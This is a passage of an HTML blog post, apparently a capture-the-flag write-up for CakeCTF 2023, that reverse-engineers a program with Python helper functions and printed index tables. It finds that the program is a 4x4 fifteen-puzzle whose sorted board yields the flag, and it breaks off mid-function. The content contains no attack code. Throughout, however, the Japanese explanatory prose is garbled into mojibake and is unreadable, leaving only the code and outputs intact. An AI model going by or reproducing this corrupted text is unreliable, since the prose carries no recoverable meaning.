                <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
        <span class=k>elif</span> <span class=n>p1</span> <span class=o>&lt;</span> <span class=s2>&#34;S&#34;</span><span class=p>:</span>
            <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;D&#34;</span><span class=p>:</span>
                <span class=k>if</span> <span class=n>s1</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>:</span>
                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;D: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
                    <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
            <span class=k>elif</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;L&#34;</span> <span class=ow>and</span> <span class=n>s2</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;L: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
                <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>

<span class=k>def</span> <span class=nf>e_index</span><span class=p>():</span>
    <span class=k>for</span> <span class=n>s1</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>]&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>s2</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;U: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;R: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;D: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;L: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>

    
<span class=k>def</span> <span class=nf>q</span><span class=p>():</span>
    <span class=n>s1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
        <span class=k>if</span> <span class=mi>2</span> <span class=o>&lt;</span> <span class=n>s1</span><span class=p>:</span>
            <span class=k>return</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]:</span>
                <span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>])</span>
                <span class=k>return</span> <span class=mi>1</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]:</span>
                <span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>])</span>
                <span class=k>return</span> <span class=mi>1</span>
        <span class=n>s1</span> <span class=o>+=</span> <span class=mi>1</span>

<span class=k>def</span> <span class=nf>q_index</span><span class=p>():</span>
    <span class=n>s1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
        <span class=k>if</span> <span class=mi>2</span> <span class=o>&lt;</span> <span class=n>s1</span><span class=p>:</span>
            <span class=k>return</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
            <span class=nb>print</span><span class=p>(((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
        <span class=n>s1</span> <span class=o>+=</span> <span class=mi>1</span>

<span class=k>def</span> <span class=nf>f</span><span class=p>(</span><span class=n>i1</span><span class=p>,</span> <span class=n>i2</span><span class=p>):</span> <span class=c1># exchange i1, i2 -&gt; i2, i1</span>
    <span class=n>i1</span> <span class=o>=</span> <span class=n>i1</span> <span class=o>^</span> <span class=n>i2</span>
    <span class=n>i2</span> <span class=o>=</span> <span class=n>i2</span> <span class=o>^</span> <span class=n>i1</span>
    <span class=n>i1</span> <span class=o>=</span> <span class=n>i1</span> <span class=o>^</span> <span class=n>i2</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>i1</span><span class=p>,</span> <span class=n>i2</span><span class=p>)</span>

</code></pre></td></tr></table>
</div>
</div><p>ã¾ãšã€<code>q</code>é–¢æ•°ã§ã©ã“ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã§æ¯”è¼ƒã—ã¦ã„ã‚‹ã‹ã‚’<code>q_index</code>ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè¡Œã—ã¦ç¢ºèªã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>[0]
&lt;s1=0, s2=0&gt;
M[4] &gt;= M[0]
M[16] &gt;= M[0]
&lt;s1=0, s2=1&gt;
M[8] &gt;= M[4]
M[20] &gt;= M[4]
&lt;s1=0, s2=2&gt;
M[12] &gt;= M[8]
M[24] &gt;= M[8]

[1]
&lt;s1=1, s2=0&gt;
M[20] &gt;= M[16]
M[32] &gt;= M[16]
&lt;s1=1, s2=1&gt;
M[24] &gt;= M[20]
M[36] &gt;= M[20]
&lt;s1=1, s2=2&gt;
M[28] &gt;= M[24]
M[40] &gt;= M[24]

[2]
&lt;s1=2, s2=0&gt;
M[36] &gt;= M[32]
M[48] &gt;= M[32]
&lt;s1=2, s2=1&gt;
M[40] &gt;= M[36]
M[52] &gt;= M[36]
&lt;s1=2, s2=2&gt;
M[44] &gt;= M[40]
M[56] &gt;= M[40]
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã ã‘ã ã¨ã‚ˆãã‚ã‹ã‚‰ãªã„ã®ã§ã€ãƒãƒƒã‚»å›³ã§ã¾ã¨ã‚ã¾ã™ã€‚
<img src=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse.jpg width=1941 height=1957 srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_480x0_resize_q75_box.jpg 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_1024x0_resize_q75_box.jpg 1024w" loading=lazy alt="qé–¢æ•° ãƒãƒƒã‚»å›³" class=gallery-image data-flex-grow=99 data-flex-basis=238px>
ã¨ã¦ã‚‚ãã‚Œã„ãªãƒ‘ã‚¿ãƒ¼ãƒ³ãŒå‡ºã¦ãã¾ã—ãŸã€‚ã“ã®ãƒãƒƒã‚»å›³ã‹ã‚‰0ã‹ã‚‰56ã¾ã§æ˜‡é †ã§ã‚½ãƒ¼ãƒˆã™ã‚Œã°<code>q</code>é–¢æ•°ã¯0ã‚’è¿”ã—ã¦ãã‚Œã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚</p>
<p>æ¬¡ã«ã€<code>e</code>é–¢æ•°ã§ã¯ã©ã®ã‚ˆã†ãªã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã§äº¤æ›ã‚’è¡Œã£ã¦ã„ã‚‹ã‹<code>e_index</code>ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè¡Œã—ã¦ç¢ºèªã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>[0, 0]
U: 0, -16
R: 0, 4
D: 0, 16
L: 0, -4
[0, 1]
U: 4, -12
R: 4, 8
D: 4, 20
L: 4, 0
[0, 2]
U: 8, -8
R: 8, 12
D: 8, 24
L: 8, 4
[0, 3]
U: 12, -4
R: 12, 16
D: 12, 28
L: 12, 8
[1, 0]
U: 16, 0
R: 16, 20
D: 16, 32
L: 16, 12
[1, 1]
U: 20, 4
R: 20, 24
D: 20, 36
L: 20, 16
[1, 2]
U: 24, 8
R: 24, 28
D: 24, 40
L: 24, 20
[1, 3]
U: 28, 12
R: 28, 32
D: 28, 44
L: 28, 24
[2, 0]
U: 32, 16
R: 32, 36
D: 32, 48
L: 32, 28
[2, 1]
U: 36, 20
R: 36, 40
D: 36, 52
L: 36, 32
[2, 2]
U: 40, 24
R: 40, 44
D: 40, 56
L: 40, 36
[2, 3]
U: 44, 28
R: 44, 48
D: 44, 60
L: 44, 40
[3, 0]
U: 48, 32
R: 48, 52
D: 48, 64
L: 48, 44
[3, 1]
U: 52, 36
R: 52, 56
D: 52, 68
L: 52, 48
[3, 2]
U: 56, 40
R: 56, 60
D: 56, 72
L: 56, 52
[3, 3]
U: 60, 44
R: 60, 64
D: 60, 76
L: 60, 56
</code></pre></td></tr></table>
</div>
</div><p>ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’è¡¨ã—ã¦ã„ã‚‹ã®ã«è² ã®æ•°ã‚’è¿”ã—ã¦ã„ã‚‹ã‚‚ã®ã‚„ç¯„å›²å¤–ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã«ãªã‚‹ã‚‚ã®ãŒã‚ã‚Šã¾ã™ãŒã€<code>e</code>é–¢æ•°ã®æ¡ä»¶ã§ã“ã‚Œã‚‰ã¯å¼¾ã‹ã‚Œã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚<code>s</code>é–¢æ•°ã¯<code>M</code>é–¢æ•°ã®0ã®ä½ç½®ã‚’2æ¬¡å…ƒã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã¨ã—ã¦è¿”ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚</p>
<p>ä»¥ä¸Šã®æ•°å€¤ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã‚ã‹ã‚‹ã“ã¨ã¯ã€å…¨ã¦ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã«ãŠã„ã¦ã€Uã‚’å…¥åŠ›ã™ã‚‹ã¨$4\times4$ã ã‘å€¤ãŒæ¸›ã£ã¦ã„ã‚‹ã€Rã‚’å…¥åŠ›ã™ã‚‹ã¨$1\times4$ã ã‘å€¤ãŒå¢—ãˆã¦ã„ã‚‹ã€Dã‚’å…¥åŠ›ã™ã‚‹ã¨$4\times4$ã ã‘å€¤ãŒå¢—ãˆã¦ã„ã‚‹ã€Lã‚’å…¥åŠ›ã™ã‚‹ã¨$1\times4$ã ã‘å€¤ãŒæ¸›ã£ã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚</p>
<p>ã“ã‚Œã‚‰ã®ã“ã¨ã‹ã‚‰ã€ã“ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯$4\times4$ã§æ§‹æˆã•ã‚Œã‚‹15ãƒ‘ã‚ºãƒ«ã‚’è¡¨ã—ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚å…·ä½“çš„ã«ã¯ã€æ¬¡ã®ã‚ˆã†ãªãƒ‘ã‚ºãƒ«ãŒã‚ã‚Šã€0ã‚’ç§»å‹•ã•ã›ã¦ã€å·¦ä¸Šã‹ã‚‰å€¤ã‚’æ˜‡é †ã«ä¸¦ã¹ã‚‹ã“ã¨ã§ã€flagã‚’å¾—ã‚‰ã‚Œã‚‹ã‚ˆã†ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ãªã£ã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚<code>M</code>ã¯ã“ã®ãƒ‘ã‚ºãƒ«ã®ç›¤é¢ã ã£ãŸã‚ˆã†ã§ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>1146640091 1277362948 0002245791 1729795767 
1817593079 2146722439 1860814889 1557802610 
0000000000 1770948809 0870734415 1355570260 
0323584794 1405652852 0629508793 1928951512 
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã ã¨å€¤ãŒå¤§ãã™ãã¦ç›¤é¢ã®çŠ¶æ…‹ãŒã‚ˆãåˆ†ã‹ã‚‰ãªã„ã®ã§ã€0ã‹ã‚‰15ã¾ã§ã®å€¤ã§ä»¥ä¸Šã®15ãƒ‘ã‚ºãƒ«ã‚’è¡¨ã—ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>05 06 01 10 
12 15 13 09 
00 11 04 07 
02 08 03 14
</code></pre></td></tr></table>
</div>
</div><p>ã“ã‚Œã‚’å·¦ä¸Šã‹ã‚‰0ã‹ã‚‰15ã§ä¸¦ã¹æ›¿ãˆã¦ã„ãã¾ã™ã€‚å¤šåˆ†åŠ¹ç‡ã®ã„ã„ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯ã‚ã‚‹ã¨æ€ã„ã¾ã™ãŒã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ æ›¸ãã‚ˆã‚Šè§£ã„ãŸæ–¹ãŒé€Ÿã„ã¨æ€ã„ã€äººåŠ›ã§è§£ãã¾ã—ãŸã€‚ï¼ˆçµå±€ã€ã¨ã¦ã‚‚æ™‚é–“ã‹ã‹ã‚Šã¾ã—ãŸï¼‰</p>
<p>ãƒ‘ã‚ºãƒ«ã‚’è§£ãã‚„ã™ãã™ãŸã‚ã€ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¦ã€ãƒ‘ã‚ºãƒ«ã‚’è§£ã„ã¦ã„ãã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=k>def</span> <span class=nf>puzzle_index</span><span class=p>():</span>
    <span class=n>index</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)]</span>
    <span class=n>puzzle</span> <span class=o>=</span> <span class=p>[]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=n>puzzle</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
    <span class=n>sorted_puzzle</span><span class=p>,</span> <span class=n>sorted_index</span> <span class=o>=</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=nb>sorted</span><span class=p>(</span><span class=nb>zip</span><span class=p>(</span><span class=n>puzzle</span><span class=p>,</span> <span class=n>index</span><span class=p>),</span> <span class=n>reverse</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
    <span class=k>return</span> <span class=n>sorted_index</span><span class=p>,</span> <span class=n>sorted_puzzle</span>

<span class=k>def</span> <span class=nf>state_puzzle</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>):</span>
    <span class=n>puzzle</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
    <span class=n>index</span><span class=p>,</span> <span class=n>sorted_puzzle</span> <span class=o>=</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=nb>sorted</span><span class=p>(</span><span class=nb>zip</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>,</span> <span class=n>puzzle</span><span class=p>)))</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>sorted_puzzle</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>     
    
<span class=k>def</span> <span class=nf>show_slide</span><span class=p>():</span>
    <span class=n>counter</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
